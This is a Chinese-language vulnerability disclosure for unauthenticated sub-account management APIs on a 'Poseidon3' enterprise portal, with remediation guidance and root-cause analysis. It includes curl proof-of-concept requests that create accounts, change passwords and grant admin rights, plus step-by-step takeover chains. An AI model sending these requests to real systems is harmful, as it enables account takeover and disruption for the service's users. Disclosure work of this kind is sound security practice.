---
layout: about
category: about
Researchname: 「poseidon3」：子账号管理接口未授权访问
toc: true
author: Bin4xin
permalink: /about/poseidon3-sub-account-management-unauthorized-access/
desc: 「poseidon3」
---

# 子账号管理接口未授权访问

{: .table}
| 字段 | 内容 |
|------|------|
| **报告编号** | VULN-OMS-2026-005 |
| **漏洞等级** | 中危 |
| **漏洞类型** | 未授权访问 (Broken Access Control) |
| **目标系统** | example-poseidon3.*****.com (Poseidon3企业应用平台) |
| **发现日期** | 2026-07-07 |
| **影响服务** | po-server（门户服务） |

---

## 1. 漏洞概述

Poseidon3企业应用平台的子账号管理模块包含6个接口，涵盖子账号的查询、创建、密码修改、权限设置、状态更新和统计等功能，所有接口均无需任何身份认证即可访问。攻击者可利用这些接口完全控制目标用户的子账号体系，包括创建具有管理员权限的子账号、修改任意子账号密码、授予或撤销权限等，实现对用户体系的全面接管。该漏洞属于OWASP Top 10中A01:2021 - Broken Access Control类别。

---

## 2. 漏洞位置

### 2.1 接口地址

{: .table}
| 序号 | 功能 | 接口地址 | 请求方法 |
|------|------|----------|----------|
| 1 | 查询子账号列表 | `/po-server/portal/member/subCons/queryData` | POST |
| 2 | 添加子账号 | `/po-server/portal/member/subCons/addSubCons` | POST |
| 3 | 修改子账号密码 | `/po-server/portal/member/subCons/changePwd` | POST |
| 4 | 设置子账号权限 | `/po-server/portal/member/subCons/setAuth` | POST |
| 5 | 更新子账号状态 | `/po-server/portal/member/subCons/updateSubConsStatus` | POST |
| 6 | 统计子账号数量 | `/po-server/portal/member/subCons/countSubUser` | POST |

### 2.2 前端调用代码

在前端构建产物 `pages.e7b00d27.js` 中发现如下调用逻辑：

```javascript
// pages.e7b00d27.js
poServer.post("/portal/member/subCons/queryData", params);
poServer.post("/portal/member/subCons/addSubCons", params);
poServer.post("/portal/member/subCons/changePwd", params);
poServer.post("/portal/member/subCons/setAuth", params);
poServer.post("/portal/member/subCons/updateSubConsStatus", params);
poServer.post("/portal/member/subCons/countSubUser", params);
```

### 2.3 服务归属

该接口组由 `po-server`（门户服务）承载，未被CAS SSO保护，且接口层面无独立认证机制。

---

## 3. 泄露内容分析

### 3.1 接口功能与风险矩阵

{: .table}
| 接口 | 功能 | 泄露/篡改内容 | 风险等级 |
|------|------|--------------|----------|
| `queryData` | 查询子账号 | 子账号列表、用户名、权限信息 | 高 |
| `addSubCons` | 添加子账号 | 可创建任意子账号 | 极高 |
| `changePwd` | 修改密码 | 可修改任意子账号密码 | 极高 |
| `setAuth` | 设置权限 | 可授予任意权限 | 极高 |
| `updateSubConsStatus` | 更新状态 | 可启用/禁用子账号 | 高 |
| `countSubUser` | 统计数量 | 泄露子账号总数 | 中 |

---

## 4. 漏洞验证

### 4.1 验证请求 — 查询子账号

```bash
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/subCons/queryData" \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":10}'
```

### 4.2 验证请求 — 添加子账号

```bash
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/subCons/addSubCons" \
  -H "Content-Type: application/json" \
  -d '{
    "userName": "sub_account_01",
    "userPwd": "Sub@12345",
    "confirmPwd": "Sub@12345"
  }'
```

### 4.3 验证请求 — 修改密码

```bash
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/subCons/changePwd" \
  -H "Content-Type: application/json" \
  -d '{
    "userName": "sub_account_01",
    "newPwd": "NewPass@123",
    "confirmPwd": "NewPass@123"
  }'
```

### 4.4 验证请求 — 设置权限

```bash
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/subCons/setAuth" \
  -H "Content-Type: application/json" \
  -d '{
    "userName": "sub_account_01",
    "authList": ["admin", "superuser"]
  }'
```

### 4.5 验证要点

- 所有请求均未携带任何认证Cookie、Session Token或JWT
- 服务端返回HTTP 200状态码，未返回401/403等认证失败状态码
- 操作结果在响应体中明确返回，可确认是否执行成功

---

## 5. 攻击场景

### 5.1 完整接管攻击

```
1. 通过 queryData 查询目标用户现有子账号列表
2. 通过 addSubCons 创建攻击者控制的子账号
3. 通过 setAuth 为新子账号授予管理员权限
4. 通过 changePwd 修改目标用户其他子账号密码
5. 通过 updateSubConsStatus 禁用正常子账号
6. 攻击者完全控制目标用户的子账号体系
```

### 5.2 权限提升攻击

```
1. 通过 checkUserName 枚举出管理员用户名
2. 通过 registerSubmit 注册普通用户账号
3. 登录后通过 addSubCons 为管理员创建子账号
4. 通过 setAuth 为该子账号授予超级管理员权限
5. 使用子账号登录，获取管理员级别访问能力
```

### 5.3 业务破坏攻击

```
1. 批量创建垃圾子账号，消耗系统资源
2. 批量修改所有子账号密码，导致正常用户无法登录
3. 批量禁用子账号，中断业务运营
4. 篡改权限配置，破坏业务审批流程
```

### 5.4 攻击链

```
枚举用户名(checkUserName) → 注册普通用户(registerSubmit) → 登录获取Session → 创建子账号(addSubCons) → 授予管理员权限(setAuth) → 完全控制用户体系
```

---

## 6. 根因分析

{: .table}
| 层级 | 问题 |
|------|------|
| **架构层** | po-server 未被CAS SSO保护 |
| **代码层** | 所有子账号管理方法均未添加 `@PreAuthorize` 或 `@Secured` 注解 |
| **配置层** | Spring Security 的 `intercept-url` 规则未覆盖 `/portal/member/subCons/**` 路径 |
| **设计层** | 子账号管理模块缺少身份认证和权限校验的双重保护机制 |

---

## 7. 影响评估

{: .table}
| 维度 | 影响 |
|------|------|
| **机密性** | 高 — 可查询任意用户的子账号信息 |
| **完整性** | 高 — 可创建、修改、删除任意子账号及其权限 |
| **可用性** | 高 — 可禁用所有子账号，中断业务运营 |
| **业务影响** | 严重 — 可完全控制用户体系，导致业务数据泄露和篡改 |

---

## 8. 修复建议

### 8.1 紧急修复（P0）

1. **添加接口认证**：所有 `/portal/member/subCons/**` 接口必须要求有效的登录Session或Token。
2. **添加权限校验**：操作类接口（`addSubCons`、`changePwd`、`setAuth`、`updateSubConsStatus`）必须验证调用者具有管理员权限。
3. **添加所有权校验**：确保用户只能操作自己创建的子账号，防止越权操作。

### 8.2 短期加固（P1）

1. **操作审计日志**：记录所有子账号管理操作的详细日志，包括操作人、操作时间、操作内容和来源IP。
2. **敏感操作二次确认**：对密码修改、权限变更等敏感操作要求二次身份验证（如短信验证码）。
3. **操作频率限制**：对子账号管理接口实施频率限制，防止批量操作攻击。

### 8.3 长期加固（P2）

1. **RBAC权限模型**：建立基于角色的访问控制模型，细粒度管理子账号权限。
2. **统一认证网关**：所有微服务通过API网关统一鉴权，避免遗漏接口。
3. **安全审计**：定期进行接口权限配置审查，确保无遗漏的未授权接口。

---

## 9. 参考标准

- OWASP Top 10 2021: A01 - Broken Access Control
- CWE-284: Improper Access Control
- CWE-306: Missing Authentication for Critical Function
- GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求

---

**报告日期：** 2026-07-07